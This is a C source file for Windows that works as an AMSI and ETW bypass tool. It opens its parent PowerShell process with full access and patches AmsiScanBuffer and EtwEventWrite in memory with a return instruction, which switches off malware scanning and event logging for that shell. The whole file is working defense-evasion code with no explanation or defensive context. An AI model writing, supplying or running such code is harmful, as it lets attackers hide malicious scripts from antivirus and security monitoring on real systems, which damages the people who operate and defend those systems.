#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <TlHelp32.h>

int main(void) {

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(pe);

	int ownid = GetCurrentProcessId();
	int shellid;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	Process32First(snapshot, &pe);

	while (Process32Next(snapshot, &pe)) {
		if (pe.th32ProcessID == ownid) {
			shellid = pe.th32ParentProcessID;
			break;
		}
	}

	HANDLE shell = OpenProcess(PROCESS_ALL_ACCESS, FALSE, shellid);

	if (shell) {
		printf("powershell process found\n");
	}
	else {
		printf("failed to find a shell\n");
		return 0;
	}


	HINSTANCE amsi = LoadLibraryA("amsi.dll");
	HINSTANCE ntdll = LoadLibraryA("ntdll.dll");

	if (!amsi || !ntdll) {
		printf("failed to load libraries");
		return 0;
	}

	DWORD amsi_oldprotect;
	DWORD ntdll_oldprotect;
	char patch = 0xC3;

	void* amsiAddr = GetProcAddress(amsi, "AmsiScanBuffer");
	void* ntdllAddr = GetProcAddress(ntdll, "EtwEventWrite");

	if (!amsiAddr || !ntdllAddr) {
		printf("failed to get memory addresses");
		return 0;
	}

	if (VirtualProtectEx(shell, amsiAddr, 1, PAGE_READWRITE, &amsi_oldprotect) && VirtualProtectEx(shell, ntdllAddr, 1, PAGE_READWRITE, &ntdll_oldprotect)) {
		WriteProcessMemory(shell, amsiAddr, &patch, 1, NULL);
		printf("amsi patched\n");
		WriteProcessMemory(shell, ntdllAddr, &patch, 1, NULL);
		printf("ntdll patched\n");
	}
	else {
		printf("failed to patch \n");
		return 0;
	}

	if (VirtualProtectEx(shell, amsiAddr, 1, amsi_oldprotect, &amsi_oldprotect) && VirtualProtectEx(shell, ntdllAddr, 1, ntdll_oldprotect, &ntdll_oldprotect)) {
		printf("amsi privileges restored \n");
	}
	else {
		printf("failed to restore privileges \n");
		return 0;
	}

	return 0;
}